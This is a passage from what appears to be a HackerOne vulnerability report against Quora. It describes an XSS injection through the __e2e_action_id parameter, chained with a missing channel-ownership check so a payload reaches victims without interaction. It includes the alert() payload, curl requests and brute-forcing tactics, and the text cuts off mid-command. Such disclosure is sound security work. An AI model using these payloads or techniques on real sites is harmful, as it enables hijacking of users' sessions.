For example a \"normal\" call, with `__e2e_action_id=esko02tjqe` is the following (I've omitted most headers/params/data):\n\n```\ncurl 'https://www.quora.com/webnode2/server_call_POST?_v=####\u0026_m=load_menu'  \n-data 'json=...\u0026__e2e_action_id=esko02tjqe\u0026...'\n\n\u003e POST /webnode2/server_call_POST?_v=█████\u0026_m=load_menu HTTP/1.1\n\u003e Host: www.quora.com\n\u003e Cookie: █████████████████████\n...\n\u003c HTTP/1.1 200 OK\n\u003c Content-Type: application/json; charset=utf-8\n\u003c Server: nginx\n\u003c \n{\"value\": {\n     \"html\": ..., \n      \"css\": .......,                             (↓↓↓↓↓↓ reflected ID)\n       \"js\": \"require('actions').finishAction('esko02tjqe', {\\\"controller\\\": \\\"webnode2\\\", \\\"action\\\": \\\"server_call_POST\\\", \\\"standard\\\": {}, \\\"serverTime\\\": 34511, \\\"mustReport\\\": true});\\n            var webnode = require('shared/core/webnode');\\n   ....     \"}, \n   \"pmsg\": null}\n```\nSince no escaping is performed, it is possible to inject code, for example setting `__e2e_action_id=',alert(),'` which will produce:\n```\n...\n \"js\": \"require('actions').finishAction('',alert(),'', {\\\"cont... \"}, \n...\n```\ncreating a valid js section that execute `alert()`.\nFortunately this vulnerability can't be triggered as it is because this would require the malformed request to be sent by Quora.com since it is `./shared/core/rpc.js` that execute the response (that has a content type of `application/json`) and seems that there is no way to directly set the `__e2e_action_id` on a session of Quora (a new one is generated  for each action).\n\n## Deliver the XSS using JSONP\n\nI've noticed another \"vulnerability\" that can be chained with the aforementioned to be able to effectively\ndeliver the XSS to an user.\nWhen an user is on Quora, to its page is associated a \"channel\" (I hope this is the correct name) such as `main-w-dep3105-32490323....` and there is always a request that try to fetch new \"update\" from a\nchannel (restarted each time it returns).  \nThis request is `update` on *.tch.quora.com, for example:\n\n```\nREQUEST\nhttps://tch969298.tch.quora.com/up/chan43-8888/updates?\u0026callback=jsonp\u003ccallback_name\u003e\u0026channel=main-w-dep3105-32490323....\u0026hash=16762940...\n\nPOSSIBLE RESPONSE:\njsonp\u003ccallback_name\u003e({\"messages\":[\"require.whenReady(\\\"main\\\", function() {\\n ... ,\"min_seq\":1591113381})\n```\n\nThe action `/server_call_POST?_m=edit` (used for example when an user change its profile description), do not behave like `/server_call_POST?_m=load_menu` (described in the first section). What I mean is that they do not reply with the response `{\"value\": {\"html\": ..., \"css\": ...., \"js\": ...}, \"pmsg\": \"\"}` to update the page but they reply with a response `{\"value\": null, \"pmsg\": null}` and *deliver the update through a message on the channel of the user*.\n\nFor example after a `/server_call_POST?_m=edit` with `__e2e_action_id=eskrisktsq` the `/update?` request reply with:\n```\njsonp\u003ccallback_name\u003e({\"messages\":[\"require.whenReady(\\\"main\\\", function()\n {require('actions').finishAction('eskrisktsq' ... \u003cother data of the edit action\u003e\n                                     ↑↑↑↑↑\n             (__e2e_action_id of the _m=edit call reflected)\n     \n```\non which `eskrisktsq` is the `__e2e_action_id` used on the `_m=edit` call vulnerable to XSS.\nThe fact that `_m=edit` sent a message to the channel `main-w-dep3105-32490323....` it's because this channel is specified as parameter on the request `_m=edit`:\n```\ncurl 'https://www.quora.com/webnode2/server_call_POST?_v=███████\u0026_m=edit' \n--data 'json={\n\"args\":[],\"kwargs\":{the data of the edit}}\u0026\nrevision=███████████\u0026\nformkey=███████████\u0026\npostkey=███████████\u0026\nwindow_id=dep3105-32490323....\u0026                          ← specified here\n_lm_window_id=dep3105-32490323....\u0026                      ←   and here\n__e2e_action_id=eskrisktsq\u0026\n\u0026__vcon_json=[█████]\u0026.....' \n```\n\nThe real problem is that this method **do not check if the specified channel is associated to user session who performed the call**. So what could happen is that the attacker can send the XSS to\na specified channel name that will be triggered as soon as the `update?` request (of the victim user) receives the evil data, without any interaction of the victim.\nThe *effect* of `_m=edit` (eg: change the profile description) is applied to the Attacker profile (since on the request are used Cookies, formkey and postkey of the Attacker) but *the finishAction() message* (vulnerable to XSS) is sent to the *victim* channel name.\n\nI can confirm that this behavior is not present on other methods: for example with `_m=load_menu` if you try to change the `window_id` you obtain a 500 Internal Server Error, this should demonstrate that there is some check missing on methods such as `_m=edit`.  \nI've not tested other methods, anyway I think that all the methods that reply with `{\"value\": null, \"pmsg\": null}` are vulnerable but not the ones that reply with the update directly (as `_m=load_menu` does) .\n\nThe *strong* premise said on the summary is that an attacker should know the victim channel_name and, that seems not easy to obtain, but if there are ways to do this, this vulnerability will become a serious problem since no victim interaction is required to perform the attack.\n\nAnyway is still possible to do a bruteforce on channel name spreading the attack on random users. To this end I want to call on your attention some pro/cons aspect for the attacker:\n\n   0. There could be easy ways that I did not find to leak valid channel_name\n   1. The attack can't be stopped from browser XSS filters\n   2. The XSS seems to work only on Quora.com (Android do not use `__e2e_action_id`, IOs not tested)\n   3. A channel_name is composed of `dep\u003c4 digit[0-9]\u003e-\u003cup to 19 digit[0-9]\u003e`. Valid 4 digits for `dep`\n can be leaked using `https://www.quora.com/check_livedeps/index?window_id=dep3304-`\n  that seems to respond with \"ok\" if the 4 digits (in this case 3304) are part of a channel alive.\n   4. the remaining part is infeasible to enumerate (10^19), but should be noted that:\n     -  doing the evil request returns an HTTP status code 200, so the attack can be distributed on multiple Attacker's Quora Profiles created for the attack, and metrics such as increased error rate (http 500) do not highlight any attack.\n     - if the XSS is sent to a channel_name that is not used by any user and Quora assigns this\n       channel_name, up to 5minutes **later** the evil request was sent, the XSS is delivered correctly.\n       (BTW I do not know if Quora would assign a channel name on which a message is already \"pending\")\n     -I think the attacker can keep busy some channels name (reducing the space to enumerate),\nlogging and executing the same code that Quora uses to attach a channel to an user, e.g:   \n\n````\n require(\"tchannel_up\").start(0, \"main-w-dep3104-34040...\", \"2287....\", \"chan42-8888\", \"quora.com\", \"\");\n\nor simply a repeated GET on:\n\nhttps://tch969298.tch.quora.com/up/chan42-8888/updates?\u0026callback=jsonp\u003ccallback_name\u003e\u0026channel=main-w-dep3104-34040...\u0026hash=2287....\n```` \nsince seems that there isn't a limit on how much \"active\" channel are reserved for a user session (I've not tried extensively, but i've executed 3 time the code with channel saved from past session - since you need the `hash` params - and works).\n\n\n### Steps To Reproduce\n\nI describe the steps using browser Chromium, but it is not stricly necessary\n\n1. Attacker log in on Quora.com and goes on its profile page \n2. Attacker open developer tools of its browser and goes on the \"Network\" tab\n3. Attacker update its profile description using dummy data and copy the request performed on `server_call_POST?_m=edit`, eg:\n    \n    ```curl 'https://www.quora.com/webnode2/server_call_POST?_v=2rtUq6Z4HO9gWK\u0026_m=edit' -H 'Cookie: m-b=\"██████████████████\";

\nLet me know if you need more informations or when it is fixed, I will re-check.\n\nThank you, I learned new things ^^ (and sorry for my english) \n\n","automated_response":false,"created_at":"2017-08-19T19:01:28.562Z","updated_at":"2017-08-19T19:01:28.562Z","actor":{"username":"0xnan","cleared":false,"url":"/0xnan","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"quora","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1950475,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @sriram-quora, there is any update with this last issue?
